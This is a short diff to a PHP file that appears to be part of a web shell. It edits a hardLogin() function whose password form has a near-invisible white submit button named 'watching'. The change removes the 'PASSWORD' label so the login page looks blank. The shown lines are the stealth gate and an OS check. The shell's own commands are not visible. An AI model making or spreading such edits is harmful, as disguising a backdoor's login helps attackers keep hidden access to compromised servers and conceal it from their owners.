@@ -52,7 +52,7 @@ function hardLogin() {
 		  exit;
 		  }
 		}
-	die("<pre align=center><form method=post>PASSWORD<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#fff;color:#fff;cursor:pointer;'></form></pre>");
+	die("<pre align=center><form method=post><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#fff;color:#fff;cursor:pointer;'></form></pre>");
 }
 if(strtolower(substr(PHP_OS,0,3)) == "win")
 	$os = 'win';
